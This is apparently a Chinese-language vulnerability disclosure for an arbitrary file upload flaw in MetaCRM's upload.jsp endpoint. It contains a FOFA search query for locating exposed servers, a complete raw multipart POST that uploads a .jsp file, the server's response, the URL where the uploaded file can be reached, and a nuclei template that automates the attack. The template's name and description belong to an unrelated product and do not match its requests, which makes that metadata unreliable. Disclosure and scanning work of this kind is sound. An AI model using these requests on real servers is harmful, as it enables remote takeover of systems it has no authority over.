**漏洞名称**

美特CRM upload.jsp 任意文件上传漏洞

**漏洞影响**

美特CRM

**漏洞描述**

美特软件是中国最强大的客户关系管理软件MetaCRM的提供商。MetaCRM是一款智能平台化CRM软件,通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特软件的使命是为企业客户提供咨询、产品、实施、服务在内一体化的客户关系管理服务。为客户先进、高效、实用的CRM软件系统，协助客户有效管理企业资源，提高运营效率，与客户一起走向成功。该系统upload.jsp 接口处存在任意文件上传漏洞，会导致系统被远控，请及时修复。

**FOFA搜索语句**

```ymal
body="/common/scripts/basic.js"
```

**漏洞复现**

```yaml

POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Content-Length: 709
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1imovELzPsfzp5dN
Upgrade-Insecure-Requests: 1

------WebKitFormBoundary1imovELzPsfzp5dN
Content-Disposition: form-data; name="file"; filename="kjldycpvjrm.jsp"
Content-Type: application/octet-stream

nyhelxrutzwhrsvsrafb
------WebKitFormBoundary1imovELzPsfzp5dN
Content-Disposition: form-data; name="key"

null
------WebKitFormBoundary1imovELzPsfzp5dN
Content-Disposition: form-data; name="form"

null
------WebKitFormBoundary1imovELzPsfzp5dN
Content-Disposition: form-data; name="field"

null
------WebKitFormBoundary1imovELzPsfzp5dN
Content-Disposition: form-data; name="filetitile"

null
------WebKitFormBoundary1imovELzPsfzp5dN
Content-Disposition: form-data; name="filefolder"

null
------WebKitFormBoundary1imovELzPsfzp5dN--
```

```reponse

HTTP/1.1 200 OK
Connection: close
Content-Length: 965
Content-Type: text/html;charset=UTF-8
Date: Wed, 22 May 2024 10:36:27 GMT
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=7E5B982B41A1A1CBFE138E86494AC0BE; Path=/; HttpOnly





<html>
<head>
  <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
  <link rel="stylesheet" type="text/css" href="/common/css/classic.css"></link>
  <script language="JavaScript" src="/common/scripts/resource.js"></script>
  <script language="JavaScript" src="/develop/systparam/softlogo/uploadfile.js"></script>
</head>
<body>
<script language="javascript">
<!--
        var parentKey="null";
        var parentForm="null";
        var parentField="null";
        var parentFilTitle="null";
        var parentCorpName="";
        if (20<=0 || 1<=0) {
          initurl2(parentKey,parentForm,parentField,parentFilTitle);
        }
        else {
          var oForm=window.parent.document.forms[parentForm];
          oForm.elements["null"].value="/userfile/default/userlogo/kjldycpvjrm.jsp";
          //alert( oForm.elements["null"].value);
          oForm.elements["null"].value="kjldycpvjrm.jsp";
          //alert( oForm.elements["null"].value);

          javascript:closeMe2();
        }
//-->
</script>
</body>
</html>
```

第二步，查看回显文件

```url
http://x.x.x.x/userfile/default/userlogo/kjldycpvjrm.jsp
```

**nuclei poc**

```yaml

id: meite-upload-fileupload

info:
  name: 和丰多媒体信息发布系统 QH.aspx 任意文件上传漏洞
  author: fgz
  severity: critical
  description: 和丰多媒体信息发布系统是一种用于多媒体信息发布和管理的系统。它提供了多种功能，包括但不限于图片、视频、文字等多种形式的信息发布和展示。该系统能够根据用户需求，灵活地管理和展示各类信息内容，为用户提供良好的信息浏览和管理体验。和丰多媒体信息发布系统 存在文件上传漏洞,恶意攻击者可以上传恶意软件，例如后门、木马或勒索软件，以获取对服务器的远程访问权限或者破坏系统，对服务器造成极大的安全隐患。该系统QH.aspx接口处存在任意文件上传漏洞，容易导致系统被远控。
  metadata:
    max-request: 1
    fofa-query: app="和丰山海-数字标牌"
    verified: true
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}"
  file_content: "{{to_lower(rand_text_alpha(20))}}"
  rboundary: "{{to_lower(rand_text_alpha(16))}}"
requests:
  - raw:
      - |+
        POST /develop/systparam/softlogo/upload.jsp?key=null&form=null&field=null&filetitle=null&folder=null& HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 995
        Cache-Control: max-age=0
        Upgrade-Insecure-Requests: 1
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="file"; filename="{{file_name}}.jsp"
        Content-Type: application/octet-stream
        
        {{file_content}}
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="key"
        
        null
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="form"
        
        null
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="field"
        
        null
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="filetitile"
        
        null
        ------WebKitFormBoundary{{rboundary}}
        Content-Disposition: form-data; name="filefolder"
        
        null
        ------WebKitFormBoundary{{rboundary}}--

      - |
        GET /userfile/default/userlogo/{{file_name}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        Accept-Encoding: gzip

    matchers:
      - type: dsl
        dsl:
#          - "status_code_1 == 200 && contains(body_1, '{{file_name}}.jsp')"
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
```

